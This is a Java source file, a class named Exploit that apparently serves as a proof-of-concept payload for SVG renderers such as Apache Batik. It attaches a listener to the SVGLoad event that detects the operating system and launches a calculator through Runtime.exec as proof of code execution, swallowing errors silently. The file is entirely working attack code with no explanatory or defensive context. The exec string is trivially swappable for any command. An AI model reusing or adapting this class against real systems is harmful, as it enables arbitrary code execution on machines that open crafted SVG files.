import org.w3c.dom.events.Event;
import org.w3c.dom.events.EventListener;

import org.w3c.dom.svg.EventListenerInitializer;
import org.w3c.dom.svg.SVGDocument;
import org.w3c.dom.svg.SVGSVGElement;

import java.util.*;
import java.io.*;

public class Exploit implements EventListenerInitializer {
    public Exploit() {
    }
    public void initializeEventListeners(SVGDocument document) {
        SVGSVGElement root = document.getRootElement();
        EventListener listener = new EventListener() {
            public void handleEvent(Event event) {
                String OS = System.getProperty("os.name", "unknown").toLowerCase(Locale.ROOT);
                try {
                    if(OS.contains("win")){
                        Process p = Runtime.getRuntime().exec("calc.exe");
                    }else if(OS.contains("mac")){
                        Process p = Runtime.getRuntime().exec("open -a calculator");
                    } else if (OS.contains("nux")) {
                        Process p = Runtime.getRuntime().exec("gnome-calculator");
                    }
                } catch (Exception e) {}
            }
        };
        root.addEventListener("SVGLoad", listener, false);
    }
}